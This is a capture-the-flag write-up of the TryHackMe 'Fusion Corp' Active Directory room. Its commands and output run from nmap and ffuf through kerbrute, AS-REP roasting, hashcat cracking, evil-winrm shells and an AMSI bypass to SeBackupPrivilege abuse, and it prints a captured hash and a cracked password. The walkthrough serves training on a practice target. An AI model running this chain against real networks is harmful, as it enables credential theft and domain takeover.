---
title: "Fusion Corp TryHackMe Writeup"
last_modified_at: 2021-06-16T11:20:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - active directory
  - AD
  - reproasting
  - kerberoasting
  - impacket
  - tryhackme
  - hard
  - kerbrute
  - ffuf
  - hashcat
  - SeBackupPrivilege
  - Backup Operator group privesc
  - Windows
  - Privilege Escaltion
  - backup
  - Nmap
  - writeup
  - walkthrough
  - fusion corp
  - Fusioncorp
  - powerview.ps1
  - Sharphound.ps1
  - Bloodhound
---

<img alt="fusioncorp" src="/assets/images/thm/fusioncorp/fusioncorp.jpeg" width="200px" height="50px">

[Fusion Corp](https://tryhackme.com/room/fusioncorp) is a hard rated windows room on tryhackme by [MrSeth6797](https://tryhackme.com/p/MrSeth6797). A backup file containing all the user infomation was found on the webserver. One of the user from the backup file has pre auth disabled and the hash was cracked to get a shell on the box as user lparker. On the box, user jmurphy had his password on the user description field and was on the backup operator group which was abused to read the root flag.

<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="reddevil2020" data-description="Support me on Buy me a coffee!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>


# Nmap
## Full Port Scan
```console
# Nmap 7.80 scan initiated Wed Jun 16 14:11:24 2021 as: nmap -p- --min-rate 1000 -v -oN nmap/allports 10.10.216.68
Nmap scan report for 10.10.216.68
Host is up (0.22s latency).
Not shown: 65512 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
49707/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jun 16 14:14:41 2021 -- 1 IP address (1 host up) scanned in 196.96 seconds
```
A lot of ports are open. As kerberos, DNS and LDAP are open on the box, we can assume that this a a domain controller.

## Detail Scan
```console
# Nmap 7.80 scan initiated Wed Jun 16 14:16:22 2021 as: nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49667,49668,49673,49674,49679,49688,49707 -oN nmap/detail 10.10.216.68
Nmap scan report for 10.10.216.68
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-16 08:31:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: FUSION
|   NetBIOS_Domain_Name: FUSION
|   NetBIOS_Computer_Name: FUSION-DC
|   DNS_Domain_Name: fusion.corp
|   DNS_Computer_Name: Fusion-DC.fusion.corp
|   Product_Version: 10.0.17763
|_  System_Time: 2021-06-16T08:33:55+00:00
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2021-03-02T19:26:49
|_Not valid after:  2021-09-01T19:26:49
|_ssl-date: 2021-06-16T08:34:34+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/16%Time=60C9B6E8%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-06-16T08:33:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 16 14:21:36 2021 -- 1 IP address (1 host up) scanned in 313.60 seconds
```
 
 From the cerificate of RDP, we get a domain name. Let us add the name to our hosts file.
 Since a lot of services are open, let us start our enumeration with the http service.
 
# HTTP Service on Port 80
![image](/assets/images/thm/fusioncorp/Pasted image 20210616143402.png)

![image](/assets/images/thm/fusioncorp/Pasted image 20210616143425.png)

We see few names of the staff on the homepage. We can utilize those name to create a bunch of potential username on the domain.

But before that let us use wfuzz to enumerate potential files and directories.
## Fuzzing with ffuf
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.216.68/FUZ[2/4]
.php,.asp,.aspx,.txt | tee ffuf/root.log      
                                                                           
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\         
          \/_/    \/_/   \/___/    \/_/       
                                     
       v1.2.0-git                                                          
________________________________________________                                                                                                      
                                                                           
 :: Method           : GET  
 :: URL              : http://10.10.216.68/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .php .asp .aspx .txt 
 :: Follow redirects : false                                               
 :: Calibration      : false                                               
 :: Timeout          : 10
 :: Threads          : 40                                                  
 :: Matcher          : Response status: 200,204,301,302,307,401,403 
________________________________________________                    
                                                                           
img                     [Status: 301, Size: 147, Words: 9, Lines: 2]
css                     [Status: 301, Size: 147, Words: 9, Lines: 2]
lib                     [Status: 301, Size: 147, Words: 9, Lines: 2]
js                      [Status: 301, Size: 146, Words: 9, Lines: 2]
backup                  [Status: 301, Size: 150, Words: 9, Lines: 2]
Backup                  [Status: 301, Size: 150, Words: 9, Lines: 2]
IMG                     [Status: 301, Size: 147, Words: 9, Lines: 2]
contactform             [Status: 301, Size: 155, Words: 9, Lines: 2]
CSS                     [Status: 301, Size: 147, Words: 9, Lines: 2]
Img                     [Status: 301, Size: 147, Words: 9, Lines: 2]
JS                      [Status: 301, Size: 146, Words: 9, Lines: 2]
```

- Backup looks interesting. So, let us check it out.

## Checking /backup
![image](/assets/images/thm/fusioncorp/Pasted image 20210616143516.png)
A file named **employees.ods** is present.

## Downloading and checking content
![image](/assets/images/thm/fusioncorp/Pasted image 20210616143655.png)

- This file contains the name and usernames of the employees. 
- The username format is first_letter:last_name.

Since we have a bunch of usernames, let us check if they are valid usernames on the domain.
## Using kerbrute
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ /opt/kerbrute/kerbrute userenum --dc fusion.corp -d fusion.corp username 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/16/21 - Ronnie Flathers @ropnop

2021/06/16 14:39:48 >  Using KDC(s):
2021/06/16 14:39:48 >   fusion.corp:88

2021/06/16 14:39:48 >  [+] VALID USERNAME:       lparker@fusion.corp
2021/06/16 14:39:49 >  Done! Tested 11 usernames (1 valid) in 0.561 seconds
```
We found a hit and lparker is a valid user on the box.

## Understanding how we can enumerate usernames
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py -usersfile username -no-pass -request fusion.corp/
/home/reddevil/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```
For the demonstration purpose, I am using impacket script GetNPUsers.py.
We can clearly see the difference on the response for different users.
- For administrator ( Pre Auth is disabled) which means this is a valid user on the box
- For user-does-not-exist ( Client Not found on kerberos database) which means this user is not a valid user
- Guest (Client Credentials are revoked) which means user is valid


Due to the difference on the response for invalid and valid users, we are able to enumerate valid usernames on the domain.


## Checking if our user has pre auth disabled
- While requesting the TGT(ticket granting ticket), on the first step the requesting party(user) encrypts the current timestamp with its own NTLM hash and sends it to the KDC(key distribution centre) which is the Domain Controller. Now if the KDC successfully decrypts the timestamp with the requesting user's NTLM hash, KDC will know the requesting user is a valid one. 
- This checks can be disabled(which is not a default case). In such case the KDC does not verify if the user asking for the TGT is a valid one and it sends back the TGT to the requester.
- This TGT contains some portion of data which is encrypted with the requesting user's NTLM hash which means we can take the hash offline and try to crack it.

```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ /usr/share/doc/python3-impacket/examples/GetNPUsers.py fusion.corp/ -no-pass -usersfile username -request
/home/reddevil/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

$krb5asrep$23$lparker@FUSION.CORP:bead83e810d0b3a619cc4483caefe8db$b4ee0a8d4cf482bb4ff9e3144599af8dd5540d0c2b56cf59d41db38e9df60cb7e635aca622951801f7c30eae1685b675470e3a784de3024958b5900c5f4497e535eeb55ce0ce06bb9ffb82b6ca7a8765730d2fcfad73604709006058061df45aa21cd7011c9e13be32db7f30d7461f93b83a1634490eff692050d8692427498e4870f8db278abba0ef260b84ef1149a9e69e0379492f717d7081d68ae843d7a34528e7070b3e7ef70cee11dc882cddfe86c31d9634e6f946bd21e146e3094d31ec487cd2840c44c2f9d769e9f820d9183d2d11c2d4c2de6f6eedc2317f95072029b6d05fc6babd2b2742
```
User lparker has pre authentication disabled. And we get a hash back. Let us try and crack the hash.

## Cracking the hash with hashcat
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```
![image](/assets/images/thm/fusioncorp/Pasted image 20210616144442.png)
Now we have a user with a valid credential.

## Checking if we can get   a shell using winrm
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ cme winrm fusion.corp -u username -p pass 
WINRM       10.10.216.68    5985   FUSION-DC        [*] Windows 10.0 Build 17763 (name:FUSION-DC) (domain:fusion.corp)
WINRM       10.10.216.68    5985   FUSION-DC        [*] http://10.10.216.68:5985/wsman
WINRM       10.10.216.68    5985   FUSION-DC        [+] fusion.corp\lparker:!!abbylvzsvs2k6! (Pwn3d!)
```
It says pwned means we can get a shell as user **lparker** using evil-winrm.

## Getting a shell
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ evil-winrm -i fusion.corp -u lparker -p '!**********k6!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lparker\Documents> 
```
## Getting first flag
```console
*Evil-WinRM* PS C:\Users\lparker\desktop> cat flag.txt
THM{c105b*********a8218f4ef}
```


# Privilege Escalation
## Checking if any kerberoastable users are present
- Those accounts which have their Service Principal Name(SPN) set are kerberoastable. Usually these accounts are service accounts.
- For kerberoastable account, we can request a TGS and some portion of data inside this TGS is encrypted with the NTLM hash of the service account which we can try and crack offline.
- To request for TGS, we must have a valid account on the domain. 

```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ /usr/share/doc/python3-impacket/examples/GetUserSPNs.py fusion.corp/lparker 
/home/reddevil/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
No entries found!
```
There are no entries.

## Listing Users on the box
```console
*Evil-WinRM* PS C:\Users\lparker\documents> net user 

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    jmurphy
krbtgt                   lparker
The command completed with one or more errors.
```
We can see apart from administrator and lparker(us), there is another account on the box.

## Uploading Scripts for emumeration
I uploaded SharpHound.ps1 to collect data for bloodhound and PowerView.ps1 to perform manual enumeration.
## Problem while running powerview
![image](/assets/images/thm/fusioncorp/Pasted image 20210616145825.png)
Powershell implements AMSI, which checks for mallicious scripts loaded in the memory. And the powershell has detected mallicious content on the powerview script.
## AMSI bypass
![image](/assets/images/thm/fusioncorp/Pasted image 20210616145904.png)
Now we have successfully loaded the script to the memory. 

Before continuing the manual enumeration, let us collect the data using sharphound and analyze it on bloodhound.

## Collecting data using sharphound
```console
*Evil-WinRM* PS C:\Users\lparker\desktop> Invoke-BloodHound -CollectionMethod All -Zipfilename out.zip
*Evil-WinRM* PS C:\Users\lparker\desktop> dir


    Directory: C:\Users\lparker\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2021   2:18 AM           8897 20210616021812_out.zip
-a----         3/3/2021   6:04 AM             37 flag.txt
-a----        6/16/2021   2:18 AM           9836 MGJiNDIyMDQtM2NlMi00ODg2LTk5MmUtZGQ0ZmIzNzMxYTNl.bin
-a----        6/16/2021   2:11 AM         750104 powerview.ps1
-a----        6/16/2021   2:15 AM         833024 sharp.exe
-a----        6/16/2021   2:12 AM         968400 SharpHound.ps1
```

## Analyzing on Bloodhound
As I was looking the information of user **jmurphy**, I found the password for the user on the description field.
![image](/assets/images/thm/fusioncorp/Pasted image 20210616151623.png)

## Groups that jmurphy is on
![image](/assets/images/thm/fusioncorp/Pasted image 20210616151602.png)
Also the user is in backup operator which is a privileged group. Any user on t backup operator group can read any file from the filesystem for the purpose of backing up. So, we can aim for the NTDS.dit file, which contains all the juicy information of the domain including NTLM hashes of the users.

## Shell as jmurphy
```console
reddevil@ubuntu:~/Documents/tryhackme/fusioncorp$ evil-winrm -i fusion.corp -u jmurphy -p 'u8************bRY'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint


*Evil-WinRM* PS C:\Users\jmurphy\Documents> 
```
The credentials are valid one and we have a shell as jmurphy.

## Reading second flag
```console
*Evil-WinRM* PS C:\Users\jmurphy\desktop> cat flag.txt
THM{b4aee2d***********2e047612e}
```


## Checking user's privilege
```console
*Evil-WinRM* PS C:\Users\jmurphy\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
Since we have SeBackupPrivileges, we can read any file from the system to create a backup.



## Reading final flag
I clone [this](https://github.com/giuliano108/SeBackupPrivilege) repo and upload two files and import them on poweshell.

![image](/assets/images/thm/fusioncorp/Pasted image 20210616174544.png)
```console
*Evil-WinRM* PS C:\temp> import-module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\temp> import-module .\SeBackupPrivilegeUtils.dll
```

## Trying to read final flag
```console
*Evil-WinRM* PS C:\temp> type C:\users\administrator\desktop\flag.txt
Access to the path 'C:\users\administrator\desktop\flag.txt' is denied.
At line:1 char:1
+ type C:\users\administrator\desktop\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator\desktop\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```
We can not read the final flag as we do  not have that permission. But let us create a backup of that file and then we can read the final flag.

## Making a backup of the flag
![image](/assets/images/thm/fusioncorp/Pasted image 20210616175002.png)

## Reading the flag
```console
*Evil-WinRM* PS C:\temp> type flag.txt
THM{f72988e************464d15}
```

Since the file is continuosly used by the system, we can not use this technique to copy ntds.dit file. We can create a backup of the **C** directory and then can read the content of NTDS.dit file using diskshadow.  Follow [this](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) article if you are interested on getting a system shell by dumping NTLM hashes from NTDS.dit file. 
 